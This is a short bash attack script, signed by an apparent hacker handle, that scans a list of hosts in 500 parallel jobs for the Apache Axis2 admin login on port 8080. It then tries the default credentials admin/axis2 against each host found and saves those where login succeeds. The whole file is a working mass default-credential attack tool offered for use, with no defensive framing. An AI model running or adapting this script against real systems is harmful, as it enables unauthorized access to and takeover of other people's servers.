#!/bin/bash

# coded by pwn3z #

clear
cat host | parallel -j500 'axis2=$(timeout 8 curl -s http://{}:8080/axis2/axis2-admin/login |grep -oP "axis2-web" |head -n1)
if [ "$axis2" = "axis2-web" ]
then
echo -e "http://{}:8080/axis2/axis2-admin/login" >> found
login=$(curl -s http://{}:8080/axis2/axis2-admin/login --data "userName=admin&password=axis2&submit=+Login+" |grep -oP "Invalid auth credentials!")
if [ "$login" = "Invalid auth credentials!" ]
then
echo -e "{} - AXIS2 EXISTS, BUT LOGIN FAILED!"
else
echo -e "{} - LOGIN OK!"
echo -e "http://{}:8080/axis2/axis2-admin/login" >> logged
fi
else
echo -e "{} - FAIL!"
fi'
